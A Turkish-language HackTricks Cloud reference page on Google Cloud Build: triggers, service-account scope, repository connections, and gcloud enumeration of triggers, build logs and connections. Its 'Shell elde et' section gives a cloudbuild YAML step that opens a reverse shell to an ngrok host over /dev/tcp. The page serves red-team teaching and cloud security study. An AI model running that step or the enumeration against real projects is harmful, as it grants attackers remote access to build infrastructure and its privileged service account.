# GCP - Cloud Build Enum

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 Discord grubuna** [**katılın**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **HackTricks'e PR göndererek hacking ipuçlarını paylaşın** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>
{% endhint %}

## Temel Bilgiler

Google Cloud Build, **yazılım derleme** ve sürüm süreçlerini otomatikleştiren, **kaynak kodu depolarıyla** entegre olan ve geniş bir programlama dili yelpazesini destekleyen yönetilen bir CI/CD platformudur. **Geliştiricilerin kodu otomatik olarak derlemesine, test etmesine ve dağıtmasına olanak tanır** ve derleme adımlarını ve iş akışlarını özelleştirme esnekliği sağlar.

Her Cloud Build Trigger, **bir Cloud Repository ile ilişkilidir veya doğrudan harici bir depo ile bağlantılıdır** (Github, Bitbucket ve Gitlab).

{% hint style="success" %}
Buradan veya Cloud Repositories'den Github/Bitbucket token'ını çalmanın bir yolunu göremedim çünkü depo indirildiğinde [https://source.cloud.google.com/](https://source.cloud.google.com/) URL'si üzerinden erişiliyor ve Github istemci tarafından erişilmiyor.
{% endhint %}

### Olaylar

Cloud Build şu durumlarda tetiklenebilir:

* **Bir dala push**: Dalı belirtin
* **Yeni bir etiket push**: Etiketi belirtin
* **Pull request**: PR'yi alan dalı belirtin
* **Manuel Çağrı**
* **Pub/Sub mesajı:** Konuyu belirtin
* **Webhook olayı**: Bir HTTPS URL'si açığa çıkaracak ve istek bir gizli anahtarla kimlik doğrulamalıdır

### Yürütme

3 seçenek vardır:

* Yürütülecek komutları **belirten bir yaml/json**. Genellikle: `/cloudbuild.yaml`
* Web konsolunda ve cli'de "inline" olarak belirtilebilen tek bir tane
* En yaygın seçenek
* Kimlik doğrulaması yapılmamış erişim için ilgili
* Derlemek için bir **Dockerfile**
* Derlemek için bir **Buildpack**

### SA İzinleri

**Service Account `cloud-platform` kapsamına sahiptir**, bu nedenle **tüm ayrıcalıkları kullanabilir.** Eğer **hiçbir SA belirtilmemişse** (submit yaparken olduğu gibi) **varsayılan SA** `<proj-number>@cloudbuild.gserviceaccount.com` **kullanılacaktır.**

Varsayılan olarak hiçbir izin verilmez ancak bazılarını vermek oldukça kolaydır:

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

### Onaylar

Bir Cloud Build'in **derleme yürütmeleri için onay gerektirecek şekilde yapılandırılması** mümkündür (varsayılan olarak devre dışıdır).

### PR Onayları

Tetikleyici PR olduğunda, **herkesin halka açık depolara PR yapabileceği** için, **herhangi bir PR ile tetikleyicinin yürütülmesine izin vermek** çok tehlikeli olurdu. Bu nedenle, varsayılan olarak, yürütme yalnızca **sahipler ve işbirlikçiler için otomatik olacaktır** ve diğer kullanıcıların PR'leri ile tetikleyiciyi yürütmek için bir sahip veya işbirlikçi `/gcbrun` yorumunu yapmalıdır.

<figure><img src="../../../.gitbook/assets/image (339).png" alt="" width="563"><figcaption></figcaption></figure>

### Bağlantılar ve Depolar

Bağlantılar şu şekilde oluşturulabilir:

* **GitHub:** Bir **Github token'ı almak** için izin isteyen bir OAuth istemi gösterecektir ve bu token **Secret Manager** içinde saklanacaktır.
* **GitHub Enterprise:** Bir **GithubApp** yüklemenizi isteyecektir. GitHub Enterprise ana bilgisayarınızdan bir **kimlik doğrulama token'ı** oluşturulacak ve bu projede bir **Secret Manager** sırrı olarak saklanacaktır.
* **GitLab / Enterprise:** **API erişim token'ını ve Read API erişim token'ını sağlamanız** gerekecek ve bu token **Secret Manager** içinde saklanacaktır.

Bir bağlantı oluşturulduktan sonra, **Github hesabının erişimi olan depoları bağlamak** için kullanılabilir.

Bu seçenek şu düğme aracılığıyla mevcuttur:

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Bu yöntemle bağlanan depoların **yalnızca 2. nesil kullanan Tetikleyicilerde mevcut olduğunu** unutmayın.
{% endhint %}

### Bir Depo Bağlama

Bu, bir **`bağlantı`** ile aynı şey değildir. Bu, **Github veya Bitbucket** deposuna **erişim sağlamak için farklı yollar** sunar ancak **bir bağlantı nesnesi oluşturmaz, ancak bir depo nesnesi (1. nesil) oluşturur.**

Bu seçenek şu düğme aracılığıyla mevcuttur:

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

### Depolama

Bazen Cloud Build, **tetikleyici için dosyaları depolamak üzere yeni bir depolama oluşturacaktır.** Bu, örneğin GCP'nin sunduğu örnekte olduğu gibi gerçekleşir:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Bir `.tgz` dosyasını kullanmak için [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) adlı bir Storage bucket oluşturulur.

### Shell elde et
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### cloud build içinde gcloud kurun:

```bash
steps:
  - name: 'ubuntu'
    entrypoint: 'bash'
    args:
      - '-c'
      - |
        apt-get update
        apt-get install -y curl apt-transport-https ca-certificates gnupg
        echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] http://packages.cloud.google.com/apt cloud-sdk main" | tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
        curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key --keyring /usr/share/keyrings/cloud.google.gpg add -
        apt-get update && apt-get install google-cloud-sdk
```

### cloud build içinde gcloud kurun ve kimlik doğrulaması yapın:

```bash
steps:
  - name: 'ubuntu'
    entrypoint: 'bash'
    args:
      - '-c'
      - |
        apt-get update
        apt-get install -y curl apt-transport-https ca-certificates gnupg
        echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] http://packages.cloud.google.com/apt cloud-sdk main" | tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
        curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key --keyring /usr/share/keyrings/cloud.google.gpg add -
        apt-get update && apt-get install google-cloud-sdk
        gcloud auth activate-service-account --key-file=$GOOGLE_APPLICATION_CREDENTIALS
```

### cloud build içinde gcloud kurun ve kimlik doğrulaması yapın ve proje kimliğini ayarlayın:

```bash
steps:
  - name: 'ubuntu'
    entrypoint: 'bash'
    args:
      - '-c'
      - |
        apt-get update
        apt-get install -y curl apt-transport-https ca-certificates gnupg
        echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] http://packages.cloud.google.com/apt cloud-sdk main" | tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
        curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key --keyring /usr/share/keyrings/cloud.google.gpg add -
        apt-get update && apt-get install google-cloud-sdk
        gcloud auth activate-service-account --key-file=$GOOGLE_APPLICATION_CREDENTIALS
        gcloud config set project $PROJECT_ID
```
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### Enumeration

Yapı yapılandırmalarında ve günlüklerde **hassas bilgiler bulabilirsiniz**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Ayrıcalık Yükseltme

{% content-ref url="../gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Kimlik Doğrulaması Olmayan Erişim

{% content-ref url="../gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Sömürü Sonrası

{% content-ref url="../gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 Discord grubuna** [**katılın**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) **bizi takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek hacking ipuçlarını paylaşın.

</details>
{% endhint %}
